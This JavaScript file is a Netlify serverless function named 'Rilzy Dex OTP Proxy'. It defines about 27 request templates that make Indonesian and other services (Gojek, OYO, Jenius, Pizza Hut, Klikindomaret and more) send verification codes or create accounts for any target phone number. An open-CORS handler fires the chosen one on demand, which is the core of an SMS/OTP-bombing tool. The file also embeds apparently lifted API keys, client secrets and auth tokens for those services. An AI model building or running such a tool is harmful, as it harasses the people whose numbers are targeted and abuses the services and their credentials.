// Netlify Function — Rilzy Dex OTP Proxy
// operator: RILZY DEX | moonstarstore001@gmail.com

const UA = 'RilzyDex-OTP/2.0.2.6';

function normalize(n) {
  return String(n).replace(/[\s\-]/g, '').replace(/^\+?62/, '').replace(/^0/, '');
}

// Definisi semua endpoint
const ENDPOINTS = {

  // --- STABIL ---
  klikindomaret: (n) => ({
    method: 'GET',
    url: `https://account-api-v1.klikindomaret.com/api/PreRegistration/SendOTPSMS?NoHP=${n}`,
    headers: { 'Content-Type': 'application/json' }
  }),

  klikwa: (n) => ({
    method: 'POST',
    url: 'https://api.klikwa.net/v1/number/sendotp',
    headers: { 'Content-Type': 'application/json', 'Authorization': 'Basic QjMzOkZSMzM=' },
    body: JSON.stringify({ number: '+62' + n })
  }),

  battlefront: (n) => ({
    method: 'POST',
    url: 'https://battlefront.danacepat.com/v1/auth/common/phone/send-code',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    body: 'mobile_no=' + n
  }),

  pinjamindo: (n) => ({
    method: 'GET',
    url: `https://appapi.pinjamindo.co.id/api/v1/custom/send_verify_code?mobile=62${n}&app=pinjamindo&l=in&os=android`,
    headers: {}
  }),

  jumpstart: (n) => ({
    method: 'POST',
    url: 'https://api.jumpstart.id/graphql',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      operationName: 'CheckPhoneNoAndGenerateOtpIfNotExist',
      variables: { phoneNo: '+62' + n },
      query: 'query CheckPhoneNoAndGenerateOtpIfNotExist($phoneNo: String!) { checkPhoneNoAndGenerateOtpIfNotExist(phoneNo: $phoneNo) }'
    })
  }),

  asani: (n) => ({
    method: 'POST',
    url: 'https://api.asani.co.id/api/v1/send-otp',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ phone: '62' + n, email: 'moonstarstore001@gmail.com' })
  }),

  qtva: (n) => ({
    method: 'POST',
    url: 'https://qtva.id/page/frames.php?f=eVBDUVU0NE1DTStQTmgvallDaTA0QT09&p=RUtYZFBydUdXTmVWMUtnc3M1ZmtnVFpMSXRxTWlvQUduaTR6VFZzRk00UT0=&hc=bmFSencyM2FmUWxmckV4Y0pXdEVOQ1pYZW5pY0pXSlBENHZSaCtJNmtTSnR0SHJWeEJaOUhWZHVSUHpRcXhWTg==',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    body: `namaDepan=Rilzy${Math.floor(Math.random()*9999)}&emailNope=${n}&password=Indo${Math.floor(Math.random()*999)}&konfirmasiPass=Indo${Math.floor(Math.random()*999)}`
  }),

  icq: (n) => ({
    method: 'POST',
    url: 'https://u.icq.net/api/v14/rapi/auth/sendCode',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      reqId: '64708-' + Date.now(),
      params: { phone: '62' + n, language: 'en-US', route: 'sms', devId: 'ic1rtwz1s1Hj1O0r', application: 'icq' }
    })
  }),

  cairin: (n) => ({
    method: 'POST',
    url: 'https://app.cairin.id/v1/app/sms/sendCaptcha',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    body: `haveImageCode=0&fileName=6f8c3b90c845f09ff1bfe714a30aede8&phone=${n}&imageCode=&userImei=&type=registry`
  }),

  bukuwarung: (n) => ({
    method: 'POST',
    url: 'https://api-v2.bukuwarung.com/api/v2/auth/otp/send',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      action: 'LOGIN_OTP', countryCode: '+62', deviceId: 'test-1', method: 'WA',
      phone: n, clientId: '2e3570c6-317e-4524-b284-980e5a4335b6',
      clientSecret: 'S81VsdrwNUN23YARAL54MFjB2JSV2TLn'
    })
  }),

  misteraladin: (n) => ({
    method: 'POST',
    url: 'https://m.misteraladin.com/api/members/v2/otp/request',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ phone_number_country_code: '62', phone_number: n, type: 'register' })
  }),

  kredito: (n) => ({
    method: 'POST',
    url: 'https://app-api.kredito.id/client/v1/common/verify-code/send',
    headers: { 'Content-Type': 'application/json', 'User-Agent': 'okhttp/3.11.0' },
    body: JSON.stringify({ event: 'default_verification', mobilePhone: n, sender: 'jatissms' })
  }),

  gojek: (n) => ({
    method: 'POST',
    url: 'https://api.gojekapi.com/v5/customers',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded',
      'X-Platform': 'Android', 'X-AppId': 'com.gojek.app',
      'X-User-Type': 'customer', 'X-UniqueId': '8606f4e3b85968fd',
      'X-AppVersion': '3.52.2', 'Accept': 'application/json'
    },
    body: `email=rilzy${Math.floor(Math.random()*9999)}@gmail.com&name=RilzyDex&phone=62${n}&signed_up_country=ID`
  }),

  oyo: (n) => ({
    method: 'POST',
    url: 'https://identity-gateway.oyorooms.com/identity/api/v1/otp/generate_by_phone?locale=id',
    headers: { 'Content-Type': 'application/json', 'access_token': 'SFI4TER1WVRTakRUenYtalpLb0w6VnhrNGVLUVlBTE5TcUFVZFpBSnc=' },
    body: JSON.stringify({ phone: n, country_code: '+62', country_iso_code: 'ID', nod: '4', send_otp: 'true', devise_role: 'Consumer_Guest' })
  }),

  foa: (n) => ({
    method: 'POST',
    url: 'https://foreignadmits.com/api/register-otp-generate-student',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    body: `mobile=62${n}&countryCode=%2B62`
  }),

  jenius: (n) => ({
    method: 'POST',
    url: 'https://api.btpn.com/jenius',
    headers: { 'Content-Type': 'application/json', 'btpn-apikey': 'f73eb34d-5bf3-42c5-b76e-271448c2e87d', 'version': '2.36.1-7565' },
    body: JSON.stringify({
      query: 'mutation registerPhone($phone: String!,$language: Language!) { registerPhone(input: {phone: $phone,language: $language}) { authId tokenId } }',
      variables: { phone: '+62' + n, language: 'id' }, operationName: 'registerPhone'
    })
  }),

  pizzahut: (n) => ({
    method: 'POST',
    url: 'https://api-prod.pizzahut.co.id/customer/v1/customer/register',
    headers: { 'Content-Type': 'application/json', 'x-platform': 'WEBMOBILE', 'x-client-id': 'b39773b0-435b-4f41-80e9-163eef20e0ab' },
    body: JSON.stringify({
      email: 'moonstarstore001@gmail.com', first_name: 'Rilzy', last_name: 'Dex',
      password: 'Rilzy++/67', phone: '0' + n, birthday: '2000-01-02'
    })
  }),

  matahari: (n) => ({
    method: 'POST',
    url: 'https://www.matahari.com/rest/V1/thorCustomers/registration-resend-otp',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ otp_request: { mobile_number: n, mobile_country_code: '+62' } })
  }),

  depop: (n) => ({
    method: 'PUT',
    url: 'https://webapi.depop.com/api/auth/v1/verify/phone',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ phone_number: n, country_code: 'ID' })
  }),

  harvestcake: (n) => ({
    method: 'POST',
    url: 'https://harvestcakes.com/register',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    body: 'phone=' + n
  }),

  danacita: (n) => ({
    method: 'GET',
    url: `https://api.danacita.co.id/users/send_otp/?mobile_phone=${n}`,
    headers: {}
  }),

  sayurbox: (n) => ({
    method: 'POST',
    url: 'https://www.sayurbox.com/graphql/v1?deduplicate=1',
    headers: { 'Content-Type': 'application/json', 'x-sbox-tenant': 'sayurbox', 'x-binary-version': '2.2.1' },
    body: JSON.stringify({
      operationName: 'generateOTP',
      variables: { destinationType: 'whatsapp', identity: '+62' + n },
      query: 'mutation generateOTP($destinationType: String!, $identity: String!) { generateOTP(destinationType: $destinationType, identity: $identity) { id } }'
    })
  }),

  tokko: (n) => ({
    method: 'POST',
    url: 'https://api.tokko.io/graphql',
    headers: { 'Content-Type': 'application/json', 'x-tokko-api-client': 'merchant_web', 'x-tokko-api-client-version': '4.5.1' },
    body: JSON.stringify({
      operationName: 'generateOTP',
      variables: { generateOtpInput: { phoneNumber: '+62' + n, hashCode: '', channel: 'WHATSAPP', userType: 'MERCHANT' } },
      query: 'mutation generateOTP($generateOtpInput: GenerateOtpInput!) { generateOtp(generateOtpInput: $generateOtpInput) { phoneNumber } }'
    })
  }),

  carsome: (n) => ({
    method: 'POST',
    url: 'https://www.carsome.id/website/login/sendSMS',
    headers: { 'Content-Type': 'application/json', 'country': 'ID', 'x-language': 'id' },
    body: JSON.stringify({ username: n, optType: 1 })
  }),

  ktbs: (n) => ({
    method: 'GET',
    url: `https://core.ktbs.io/v2/user/registration/otp/${n}`,
    headers: {}
  })

};

exports.handler = async (event) => {
  const CORS = {
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Headers': 'Content-Type',
    'Access-Control-Allow-Methods': 'POST, OPTIONS'
  };

  if (event.httpMethod === 'OPTIONS') {
    return { statusCode: 200, headers: CORS, body: '' };
  }

  if (event.httpMethod !== 'POST') {
    return { statusCode: 405, headers: CORS, body: JSON.stringify({ error: 'Method not allowed' }) };
  }

  let payload;
  try {
    payload = JSON.parse(event.body || '{}');
  } catch (e) {
    return { statusCode: 400, headers: CORS, body: JSON.stringify({ error: 'Invalid JSON' }) };
  }

  const { endpoint, target } = payload;
  if (!endpoint || !target) {
    return { statusCode: 400, headers: CORS, body: JSON.stringify({ error: 'endpoint & target wajib' }) };
  }

  if (!ENDPOINTS[endpoint]) {
    return { statusCode: 400, headers: CORS, body: JSON.stringify({ error: 'endpoint tidak dikenal: ' + endpoint }) };
  }

  const num = normalize(target);
  const req = ENDPOINTS[endpoint](num);

  const opts = {
    method: req.method,
    headers: {
      'User-Agent': UA,
      'X-Operator': 'rilzy_dex',
      'X-Contact': 'moonstarstore001@gmail.com',
      ...(req.headers || {})
    }
  };
  if (req.body) opts.body = req.body;

  try {
    const res = await fetch(req.url, opts);
    const text = await res.text();
    return {
      statusCode: 200,
      headers: { ...CORS, 'Content-Type': 'application/json' },
      body: JSON.stringify({
        endpoint,
        target: num,
        code: res.status,
        snippet: text.slice(0, 200)
      })
    };
  } catch (e) {
    return {
      statusCode: 200,
      headers: { ...CORS, 'Content-Type': 'application/json' },
      body: JSON.stringify({
        endpoint,
        target: num,
        code: 0,
        error: e.message
      })
    };
  }
};
